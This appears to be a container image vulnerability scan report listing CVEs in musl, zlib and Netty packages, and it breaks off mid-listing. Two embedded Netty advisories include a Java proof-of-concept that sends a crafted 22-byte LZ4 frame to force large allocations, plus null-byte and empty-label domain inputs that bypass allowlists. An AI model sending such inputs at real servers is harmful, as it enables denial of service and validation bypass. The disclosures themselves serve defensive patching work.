```yaml
╭ [0] ╭ Target         : nmaguiar/nearless:build (alpine 3.24.0_alpha20260127) 
│     ├ Class          : os-pkgs 
│     ├ Type           : alpine 
│     ├ Packages        
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2026-40200 
│                       │     ├ PkgID           : musl@1.2.5-r21 
│                       │     ├ PkgName         : musl 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/musl@1.2.5-r21?arch=x86_64&distro=3.24.
│                       │     │                  │       0_alpha20260127 
│                       │     │                  ╰ UID : a7bafcf4eaef5646 
│                       │     ├ InstalledVersion: 1.2.5-r21 
│                       │     ├ FixedVersion    : 1.2.6-r2 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
│                       │     │                  │         4edd8ebe468fc57d07e 
│                       │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
│                       │     │                            0961a5292bd158a4dcf 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-40200 
│                       │     ├ DataSource       ╭ ID  : alpine 
│                       │     │                  ├ Name: Alpine Secdb 
│                       │     │                  ╰ URL : https://secdb.alpinelinux.org/ 
│                       │     ├ Fingerprint     : sha256:c7696fcf23d6f7f19c0fc23dff851ea56a36650ea6fb4d112668ab
│                       │     │                   2de30056cd 
│                       │     ├ Title           : musl: musl libc: Arbitrary code execution and denial of
│                       │     │                   service via stack-based memory corruption in qsort 
│                       │     ├ Description     : An issue was discovered in musl libc 0.7.10 through 1.2.6.
│                       │     │                   Stack-based memory corruption can occur during qsort of very
│                       │     │                   large arrays, due to incorrectly implemented double-word
│                       │     │                   primitives. The number of elements must exceed about seven
│                       │     │                   million, i.e., the 32nd Leonardo number on 32-bit platforms
│                       │     │                   (or the 64th Leonardo number on 64-bit platforms, which is
│                       │     │                   not practical). 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-670 
│                       │     ├ VendorSeverity   ─ redhat: 3 
│                       │     ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/
│                       │     │                           │           A:H 
│                       │     │                           ╰ V3Score : 7.8 
│                       │     ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2026/04/10/13 
│                       │     │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-40200 
│                       │     │                  ├ [2]: https://musl.libc.org/releases.html 
│                       │     │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-40200 
│                       │     │                  ├ [4]: https://www.cve.org/CVERecord?id=CVE-2026-40200 
│                       │     │                  ╰ [5]: https://www.openwall.com/lists/oss-security/2026/04/10/13 
│                       │     ├ PublishedDate   : 2026-04-10T17:17:14.107Z 
│                       │     ╰ LastModifiedDate: 2026-04-27T19:18:46.69Z 
│                       ├ [1] ╭ VulnerabilityID : CVE-2026-6042 
│                       │     ├ PkgID           : musl@1.2.5-r21 
│                       │     ├ PkgName         : musl 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/musl@1.2.5-r21?arch=x86_64&distro=3.24.
│                       │     │                  │       0_alpha20260127 
│                       │     │                  ╰ UID : a7bafcf4eaef5646 
│                       │     ├ InstalledVersion: 1.2.5-r21 
│                       │     ├ FixedVersion    : 1.2.6-r1 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
│                       │     │                  │         4edd8ebe468fc57d07e 
│                       │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
│                       │     │                            0961a5292bd158a4dcf 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-6042 
│                       │     ├ DataSource       ╭ ID  : alpine 
│                       │     │                  ├ Name: Alpine Secdb 
│                       │     │                  ╰ URL : https://secdb.alpinelinux.org/ 
│                       │     ├ Fingerprint     : sha256:37858d2bec1ce08c9babce6caac9eee5a24f1c4409859f7ed77da5
│                       │     │                   1d5e6fd62f 
│                       │     ├ Title           : musl libc: GB18030 4-byte Decoder: musl libc: Denial of
│                       │     │                   Service via inefficient algorithmic complexity in iconv 
│                       │     ├ Description     : A security flaw has been discovered in musl libc up to 1.2.6.
│                       │     │                    Affected is the function iconv of the file
│                       │     │                   src/locale/iconv.c of the component GB18030 4-byte Decoder.
│                       │     │                   Performing a manipulation results in inefficient algorithmic
│                       │     │                   complexity. The attack must be initiated from a local
│                       │     │                   position. To fix this issue, it is recommended to deploy a
│                       │     │                   patch. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ CweIDs           ╭ [0]: CWE-404 
│                       │     │                  ╰ [1]: CWE-407 
│                       │     ├ VendorSeverity   ─ redhat: 2 
│                       │     ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/
│                       │     │                           │           A:H 
│                       │     │                           ╰ V3Score : 5.5 
│                       │     ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2026/04/09/19 
│                       │     │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-6042 
│                       │     │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-6042 
│                       │     │                  ├ [3]: https://vuldb.com/submit/796352 
│                       │     │                  ├ [4]: https://vuldb.com/vuln/356620 
│                       │     │                  ├ [5]: https://vuldb.com/vuln/356620/cti 
│                       │     │                  ├ [6]: https://www.cve.org/CVERecord?id=CVE-2026-6042 
│                       │     │                  ├ [7]: https://www.openwall.com/lists/oss-security/2026/04/02/10 
│                       │     │                  ╰ [8]: https://www.openwall.com/lists/oss-security/2026/04/03/2 
│                       │     ├ PublishedDate   : 2026-04-10T09:16:25.45Z 
│                       │     ╰ LastModifiedDate: 2026-04-24T18:01:13.913Z 
│                       ├ [2] ╭ VulnerabilityID : CVE-2026-40200 
│                       │     ├ PkgID           : musl-utils@1.2.5-r21 
│                       │     ├ PkgName         : musl-utils 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/musl-utils@1.2.5-r21?arch=x86_64&distro
│                       │     │                  │       =3.24.0_alpha20260127 
│                       │     │                  ╰ UID : 6f37302d99121f4f 
│                       │     ├ InstalledVersion: 1.2.5-r21 
│                       │     ├ FixedVersion    : 1.2.6-r2 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
│                       │     │                  │         4edd8ebe468fc57d07e 
│                       │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
│                       │     │                            0961a5292bd158a4dcf 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-40200 
│                       │     ├ DataSource       ╭ ID  : alpine 
│                       │     │                  ├ Name: Alpine Secdb 
│                       │     │                  ╰ URL : https://secdb.alpinelinux.org/ 
│                       │     ├ Fingerprint     : sha256:e266f407cd91fa1c206259e9c63b3546f813ca5b6d9eb8b2ec7287
│                       │     │                   979b30e7eb 
│                       │     ├ Title           : musl: musl libc: Arbitrary code execution and denial of
│                       │     │                   service via stack-based memory corruption in qsort 
│                       │     ├ Description     : An issue was discovered in musl libc 0.7.10 through 1.2.6.
│                       │     │                   Stack-based memory corruption can occur during qsort of very
│                       │     │                   large arrays, due to incorrectly implemented double-word
│                       │     │                   primitives. The number of elements must exceed about seven
│                       │     │                   million, i.e., the 32nd Leonardo number on 32-bit platforms
│                       │     │                   (or the 64th Leonardo number on 64-bit platforms, which is
│                       │     │                   not practical). 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-670 
│                       │     ├ VendorSeverity   ─ redhat: 3 
│                       │     ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/
│                       │     │                           │           A:H 
│                       │     │                           ╰ V3Score : 7.8 
│                       │     ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2026/04/10/13 
│                       │     │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-40200 
│                       │     │                  ├ [2]: https://musl.libc.org/releases.html 
│                       │     │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-40200 
│                       │     │                  ├ [4]: https://www.cve.org/CVERecord?id=CVE-2026-40200 
│                       │     │                  ╰ [5]: https://www.openwall.com/lists/oss-security/2026/04/10/13 
│                       │     ├ PublishedDate   : 2026-04-10T17:17:14.107Z 
│                       │     ╰ LastModifiedDate: 2026-04-27T19:18:46.69Z 
│                       ├ [3] ╭ VulnerabilityID : CVE-2026-6042 
│                       │     ├ PkgID           : musl-utils@1.2.5-r21 
│                       │     ├ PkgName         : musl-utils 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/musl-utils@1.2.5-r21?arch=x86_64&distro
│                       │     │                  │       =3.24.0_alpha20260127 
│                       │     │                  ╰ UID : 6f37302d99121f4f 
│                       │     ├ InstalledVersion: 1.2.5-r21 
│                       │     ├ FixedVersion    : 1.2.6-r1 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
│                       │     │                  │         4edd8ebe468fc57d07e 
│                       │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
│                       │     │                            0961a5292bd158a4dcf 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-6042 
│                       │     ├ DataSource       ╭ ID  : alpine 
│                       │     │                  ├ Name: Alpine Secdb 
│                       │     │                  ╰ URL : https://secdb.alpinelinux.org/ 
│                       │     ├ Fingerprint     : sha256:ff0c3d8d0f8b29880f636e73cb10e5174b3a4696908a7408f6d4d9
│                       │     │                   ecc3f18087 
│                       │     ├ Title           : musl libc: GB18030 4-byte Decoder: musl libc: Denial of
│                       │     │                   Service via inefficient algorithmic complexity in iconv 
│                       │     ├ Description     : A security flaw has been discovered in musl libc up to 1.2.6.
│                       │     │                    Affected is the function iconv of the file
│                       │     │                   src/locale/iconv.c of the component GB18030 4-byte Decoder.
│                       │     │                   Performing a manipulation results in inefficient algorithmic
│                       │     │                   complexity. The attack must be initiated from a local
│                       │     │                   position. To fix this issue, it is recommended to deploy a
│                       │     │                   patch. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ CweIDs           ╭ [0]: CWE-404 
│                       │     │                  ╰ [1]: CWE-407 
│                       │     ├ VendorSeverity   ─ redhat: 2 
│                       │     ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/
│                       │     │                           │           A:H 
│                       │     │                           ╰ V3Score : 5.5 
│                       │     ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2026/04/09/19 
│                       │     │                  ├ [1]: https://access.redhat.com/security/cve/CVE-2026-6042 
│                       │     │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-6042 
│                       │     │                  ├ [3]: https://vuldb.com/submit/796352 
│                       │     │                  ├ [4]: https://vuldb.com/vuln/356620 
│                       │     │                  ├ [5]: https://vuldb.com/vuln/356620/cti 
│                       │     │                  ├ [6]: https://www.cve.org/CVERecord?id=CVE-2026-6042 
│                       │     │                  ├ [7]: https://www.openwall.com/lists/oss-security/2026/04/02/10 
│                       │     │                  ╰ [8]: https://www.openwall.com/lists/oss-security/2026/04/03/2 
│                       │     ├ PublishedDate   : 2026-04-10T09:16:25.45Z 
│                       │     ╰ LastModifiedDate: 2026-04-24T18:01:13.913Z 
│                       ├ [4] ╭ VulnerabilityID : CVE-2026-22184 
│                       │     ├ PkgID           : zlib@1.3.1-r2 
│                       │     ├ PkgName         : zlib 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/zlib@1.3.1-r2?arch=x86_64&distro=3.24.0
│                       │     │                  │       _alpha20260127 
│                       │     │                  ╰ UID : c6f558cca1be2488 
│                       │     ├ InstalledVersion: 1.3.1-r2 
│                       │     ├ FixedVersion    : 1.3.2-r0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
│                       │     │                  │         4edd8ebe468fc57d07e 
│                       │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
│                       │     │                            0961a5292bd158a4dcf 
│                       │     ├ SeveritySource  : nvd 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-22184 
│                       │     ├ DataSource       ╭ ID  : alpine 
│                       │     │                  ├ Name: Alpine Secdb 
│                       │     │                  ╰ URL : https://secdb.alpinelinux.org/ 
│                       │     ├ Fingerprint     : sha256:25c689b2892583b8e6ecdd227ec2287c6e124233effff4831ad1c0
│                       │     │                   45e7206502 
│                       │     ├ Title           : zlib: zlib: Arbitrary code execution via buffer overflow in
│                       │     │                   untgz utility 
│                       │     ├ Description     : zlib versions up to and including 1.3.1.2 include a global
│                       │     │                   buffer overflow in the untgz utility located under
│                       │     │                   contrib/untgz. The vulnerability is limited to the standalone
│                       │     │                    demonstration utility and does not affect the core zlib
│                       │     │                   compression library. The flaw occurs when a user executes the
│                       │     │                    untgz command with an excessively long archive name supplied
│                       │     │                    via the command line, leading to an out-of-bounds write in a
│                       │     │                    fixed-size global buffer. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-787 
│                       │     ├ VendorSeverity   ╭ nvd   : 3 
│                       │     │                  ╰ redhat: 3 
│                       │     ├ CVSS             ╭ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/
│                       │     │                  │        │           A:H 
│                       │     │                  │        ╰ V3Score : 7.8 
│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/
│                       │     │                           │           A:H 
│                       │     │                           ╰ V3Score : 8.6 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-22184 
│                       │     │                  ├ [1]: https://github.com/madler/zlib 
│                       │     │                  ├ [2]: https://github.com/madler/zlib/issues/1142 
│                       │     │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-22184 
│                       │     │                  ├ [4]: https://seclists.org/fulldisclosure/2026/Jan/3 
│                       │     │                  ├ [5]: https://www.cve.org/CVERecord?id=CVE-2026-22184 
│                       │     │                  ├ [6]: https://www.vulncheck.com/advisories/zlib-untgz-global-
│                       │     │                  │      buffer-overflow-in-tgzfname 
│                       │     │                  ╰ [7]: https://zlib.net/ 
│                       │     ├ PublishedDate   : 2026-01-07T21:16:01.563Z 
│                       │     ╰ LastModifiedDate: 2026-03-18T16:26:31.14Z 
│                       ╰ [5] ╭ VulnerabilityID : CVE-2026-27171 
│                             ├ PkgID           : zlib@1.3.1-r2 
│                             ├ PkgName         : zlib 
│                             ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/zlib@1.3.1-r2?arch=x86_64&distro=3.24.0
│                             │                  │       _alpha20260127 
│                             │                  ╰ UID : c6f558cca1be2488 
│                             ├ InstalledVersion: 1.3.1-r2 
│                             ├ FixedVersion    : 1.3.2-r0 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
│                             │                  │         4edd8ebe468fc57d07e 
│                             │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
│                             │                            0961a5292bd158a4dcf 
│                             ├ SeveritySource  : nvd 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27171 
│                             ├ DataSource       ╭ ID  : alpine 
│                             │                  ├ Name: Alpine Secdb 
│                             │                  ╰ URL : https://secdb.alpinelinux.org/ 
│                             ├ Fingerprint     : sha256:d530551246224fa578fa54702762bb0c06623031a4304afb37c03e
│                             │                   3fd40807ad 
│                             ├ Title           : zlib: zlib: Denial of Service via infinite loop in CRC32
│                             │                   combine functions 
│                             ├ Description     : zlib before 1.3.2 allows CPU consumption via crc32_combine64
│                             │                   and crc32_combine_gen64 because x2nmodp can do right shifts
│                             │                   within a loop that has no termination condition. 
│                             ├ Severity        : MEDIUM 
│                             ├ CweIDs           ─ [0]: CWE-1284 
│                             ├ VendorSeverity   ╭ amazon     : 1 
│                             │                  ├ azure      : 1 
│                             │                  ├ cbl-mariner: 1 
│                             │                  ├ julia      : 1 
│                             │                  ├ nvd        : 2 
│                             │                  ├ redhat     : 1 
│                             │                  ╰ ubuntu     : 1 
│                             ├ CVSS             ╭ julia  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/
│                             │                  │        │           A:L 
│                             │                  │        ╰ V3Score : 2.9 
│                             │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/
│                             │                  │        │           A:H 
│                             │                  │        ╰ V3Score : 5.5 
│                             │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/
│                             │                           │           A:L 
│                             │                           ╰ V3Score : 3.3 
│                             ├ References       ╭ [0] : https://7asecurity.com/blog/2026/02/zlib-7asecurity-au
│                             │                  │       dit 
│                             │                  ├ [1] : https://7asecurity.com/blog/2026/02/zlib-7asecurity-au
│                             │                  │       dit/ 
│                             │                  ├ [2] : https://7asecurity.com/reports/pentest-report-zlib-RC1
│                             │                  │       .1.pdf 
│                             │                  ├ [3] : https://access.redhat.com/security/cve/CVE-2026-27171 
│                             │                  ├ [4] : https://github.com/advisories/GHSA-h858-mf2m-8jf4 
│                             │                  ├ [5] : https://github.com/madler/zlib/issues/904 
│                             │                  ├ [6] : https://github.com/madler/zlib/releases/tag/v1.3.2 
│                             │                  ├ [7] : https://nvd.nist.gov/vuln/detail/CVE-2026-27171 
│                             │                  ├ [8] : https://ostif.org/zlib-audit-complete 
│                             │                  ├ [9] : https://ostif.org/zlib-audit-complete/ 
│                             │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-27171 
│                             ├ PublishedDate   : 2026-02-18T04:16:01.263Z 
│                             ╰ LastModifiedDate: 2026-03-25T21:27:04.603Z 
╰ [1] ╭ Target         : Java 
      ├ Class          : lang-pkgs 
      ├ Type           : jar 
      ├ Packages        
      ╰ Vulnerabilities ╭ [0]  ╭ VulnerabilityID : CVE-2026-42583 
                        │      ├ VendorIDs        ─ [0]: GHSA-mj4r-2hfc-f8p6 
                        │      ├ PkgName         : io.netty:netty-codec-compression 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-compression-4.2.12.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.12.Final 
                        │      │                  ╰ UID : d5a032dd793fa143 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.2.13.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42583 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:fb9f5bb3dfe4fea3cc45c30725e8119bb9fbec87a5322eb4f87dd
                        │      │                   58dc7c75cf7 
                        │      ├ Title           : Netty Lz4FrameDecoder is vulnerable to resource exhaustion  
                        │      ├ Description     : ### Summary
                        │      │                   Lz4FrameDecoder allocates a ByteBuf of size
                        │      │                   `decompressedLength` (up to 32 MB per block) before LZ4
                        │      │                   runs. A peer only needs a 21-byte header plus
                        │      │                   `compressedLength` payload bytes - 22 bytes if
                        │      │                   `compressedLength == 1` - to force that allocation.
                        │      │                   
                        │      │                   ### Details
                        │      │                   io.netty.handler.codec.compression.Lz4FrameDecoder#decode
                        │      │                   Header fields are trusted for sizing. On the compressed
                        │      │                   path, after `readableBytes >= compressedLength`, the decoder
                        │      │                    does `ctx.alloc().buffer(decompressedLength,
                        │      │                   decompressedLength)` then decompresses.
                        │      │                   ### PoC
                        │      │                   The test below demonstrates how an attacker sending 22 bytes
                        │      │                    will force the server to allocate 32MB
                        │      │                   ```java
                        │      │                       @Test
                        │      │                       void test() throws Exception {
                        │      │                           EventLoopGroup workerGroup = new
                        │      │                   MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());
                        │      │                           try {
                        │      │                               AtomicReference<Throwable> serverError = new
                        │      │                   AtomicReference<>();
                        │      │                               CountDownLatch latch = new CountDownLatch(1);
                        │      │                               ServerBootstrap server = new ServerBootstrap()
                        │      │                                       .group(workerGroup)
                        │      │                                       .channel(NioServerSocketChannel.class)
                        │      │                                       .childHandler(new
                        │      │                   ChannelInitializer<SocketChannel>() {
                        │      │                                           @Override
                        │      │                                           protected void
                        │      │                   initChannel(SocketChannel ch) {
                        │      │                                               ch.pipeline()
                        │      │                                                       .addLast(new
                        │      │                   Lz4FrameDecoder())
                        │      │                   ChannelInboundHandlerAdapter() {
                        │      │                                                           @Override
                        │      │                                                           public void
                        │      │                   exceptionCaught(ChannelHandlerContext ctx, Throwable cause)
                        │      │                   {
                        │      │                                                               if (cause
                        │      │                   instanceof DecoderException) {
                        │      │                                                                  
                        │      │                   serverError.set(cause.getCause());
                        │      │                                                               } else {
                        │      │                   serverError.set(cause);
                        │      │                                                               }
                        │      │                                                              
                        │      │                   latch.countDown();
                        │      │                                                           }
                        │      │                                                       });
                        │      │                                           }
                        │      │                                       });
                        │      │                               ChannelFuture serverChannel =
                        │      │                   server.bind(0).sync();
                        │      │                               Bootstrap client = new Bootstrap()
                        │      │                                       .channel(NioSocketChannel.class)
                        │      │                                       .handler(new
                        │      │                                           public void
                        │      │                   channelActive(ChannelHandlerContext ctx) {
                        │      │                                               ByteBuf buf =
                        │      │                   ctx.alloc().buffer(22, 22);
                        │      │                                               buf.writeLong(MAGIC_NUMBER);
                        │      │                                              
                        │      │                   buf.writeByte(BLOCK_TYPE_COMPRESSED | 0x0F);
                        │      │                                               buf.writeIntLE(1);
                        │      │                                               buf.writeIntLE(1 << 25);
                        │      │                                               buf.writeIntLE(0);
                        │      │                                               buf.writeByte(0);
                        │      │                                               ctx.writeAndFlush(buf);
                        │      │                                               ctx.fireChannelActive();
                        │      │                               ChannelFuture clientChannel =
                        │      │                   client.connect(serverChannel.channel().localAddress()).sync(
                        │      │                   );
                        │      │                               assertTrue(latch.await(10, TimeUnit.SECONDS));
                        │      │                              
                        │      │                   assertInstanceOf(IndexOutOfBoundsException.class,
                        │      │                   serverError.get());
                        │      │                               clientChannel.channel().close();
                        │      │                               serverChannel.channel().close();
                        │      │                           } finally {
                        │      │                               workerGroup.shutdownGracefully();
                        │      │                           }
                        │      │                       }
                        │      │                   ```
                        │      │                   ### Impact
                        │      │                   Untrusted senders without per-channel / aggregate limits can
                        │      │                    stress memory with many small requests. 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
                        │      │                         ╰ V3Score : 7.5 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ╰ [1]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-mj4r-2hfc-f8p6 
                        ├ [1]  ╭ VulnerabilityID : CVE-2026-42579 
                        │      ├ VendorIDs        ─ [0]: GHSA-cm33-6792-r9fm 
                        │      ├ PkgName         : io.netty:netty-codec-dns 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-dns-4.2.12.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.12.Final 
                        │      │                  ╰ UID : d1018bca82fa2aba 
                        │      ├ InstalledVersion: 4.2.12.Final 
                        │      ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
                        │      │                  │         94edd8ebe468fc57d07e 
                        │      │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
                        │      │                            e0961a5292bd158a4dcf 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42579 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:a7af8a9bdc0094fe18e741cbcedf4f86ec31b8beb0fc87b167f60
                        │      │                   8033804980d 
                        │      ├ Title           : Netty has a DNS Codec Input Validation Bypass (Encoder +
                        │      │                   Decoder) 
                        │      ├ Description     : # Security Vulnerability Report: DNS Codec Input Validation
                        │      │                   Bypass in Netty (Encoder + Decoder)
                        │      │                   
                        │      │                   ## 1. Vulnerability Summary
                        │      │                   | Field | Value |
                        │      │                   |-------|-------|
                        │      │                   | **Product** | Netty |
                        │      │                   | **Version** | 4.2.12.Final (and all prior versions with
                        │      │                   codec-dns) |
                        │      │                   | **Component** | `io.netty.handler.codec.dns.DnsCodecUtil`
                        │      │                   |
                        │      │                   | **Vulnerability Type** | CWE-20: Improper Input Validation
                        │      │                    / CWE-626: Null Byte Interaction Error / CWE-400:
                        │      │                   Uncontrolled Resource Consumption |
                        │      │                   | **Impact** | DNS Cache Poisoning / Domain Validation
                        │      │                   Bypass / Denial of Service / Malformed DNS Packets |
                        │      │                   ## 2. Affected Components
                        │      │                   Both the encoder and decoder in the same file are affected:
                        │      │                   - `io.netty.handler.codec.dns.DnsCodecUtil` —
                        │      │                   `encodeDomainName()` method (lines 31-51):
                        │      │                     - No null byte validation in domain name labels
                        │      │                     - No per-label length validation (RFC 1035 max: 63 bytes)
                        │      │                     - No total domain name length validation (RFC 1035 max:
                        │      │                   255 bytes)
                        │      │                     - Empty labels silently truncate the domain name
                        │      │                   `decodeDomainName()` method (lines 53-118):
                        │      │                     - No per-label length validation (max 63)
                        │      │                     - No total domain name length validation (max 255)
                        │      │                     - Unbounded StringBuilder growth from attacker-controlled
                        │      │                   DNS responses
                        │      │                   ## 3. Vulnerability Description
                        │      │                   Netty's DNS codec does **not enforce RFC 1035 domain name
                        │      │                   constraints** during either encoding or decoding. This
                        │      │                   creates a bidirectional attack surface: malicious DNS
                        │      │                   responses can exploit the decoder, and user-influenced
                        │      │                   hostnames can exploit the encoder.
                        │      │                   ### 3.1 Encoder Side — Null Byte Injection (CWE-626)
                        │      │                   A domain name containing a null byte (e.g.,
                        │      │                   `"evil\0.example.com"`) is encoded with the null byte
                        │      │                   embedded in the label data. This creates a domain name that
                        │      │                   different DNS implementations interpret differently:
                        │      │                   - **Java (full string)**: sees `"evil\0.example.com"` as a
                        │      │                   single label containing a null
                        │      │                   - **C/native DNS libraries**: truncate at the null byte,
                        │      │                   seeing only `"evil"`
                        │      │                   - **DNS servers**: may accept or reject based on
                        │      │                   implementation
                        │      │                   This differential interpretation enables **DNS cache
                        │      │                   poisoning** and **domain validation bypass**.
                        │      │                   ### 3.2 Encoder Side — Overlength Label (RFC 1035
                        │      │                   Violation)
                        │      │                   Labels exceeding 63 bytes are accepted by the encoder. The
                        │      │                   length byte is written as a single unsigned byte, so a
                        │      │                   200-byte label writes `0xC8` (200) as the length. Per RFC
                        │      │                   1035, values 192-255 indicate **compression pointers**. This
                        │      │                    means:
                        │      │                   - A 200-byte label length `0xC8` would be interpreted as a
                        │      │                   **compression pointer** by standards-compliant DNS parsers
                        │      │                   - This creates **parser confusion** between label and
                        │      │                   pointer interpretation
                        │      │                   ### 3.3 Encoder Side — Silent Truncation via Empty Labels
                        │      │                   ```java
                        │      │                   encodeDomainName("a..b.com", buf);
                        │      │                   // Encodes as: [01] 'a' [00]
                        │      │                   // Only "a." is encoded, ".b.com" is silently dropped!
                        │      │                   ```
                        │      │                   An attacker can craft input like `"safe-domain..evil.com"`
                        │      │                   which gets truncated to just `"safe-domain."`, potentially
                        │      │                   bypassing domain allowlists.
                        │      │                   ### 3.4 Decoder Side — Unbounded Memory Allocation
                        │      │                   The decoder accepts labels of any length (0-255 bytes)
                        │      │                   without checking the RFC 1035 per-label limit of 63 bytes or
                        │      │                    the total domain name limit of 255 bytes. A malicious DNS
                        │      │                   server can return responses with oversized labels, causing
                        │      │                   excessive memory allocation.
                        │      │                   ### Root Cause — Encoder
                        │      │                   // DnsCodecUtil.java:31-51
                        │      │                   static void encodeDomainName(String name, ByteBuf buf) {
                        │      │                       if (ROOT.equals(name)) {
                        │      │                           buf.writeByte(0);
                        │      │                           return;
                        │      │                       }
                        │      │                       final String[] labels = name.split("\\.");
                        │      │                       for (String label : labels) {
                        │      │                           final int labelLen = label.length();
                        │      │                           if (labelLen == 0) {
                        │      │                               break;  // NO ERROR - silently truncates!
                        │      │                           }
                        │      │                           // NO check: labelLen > 63
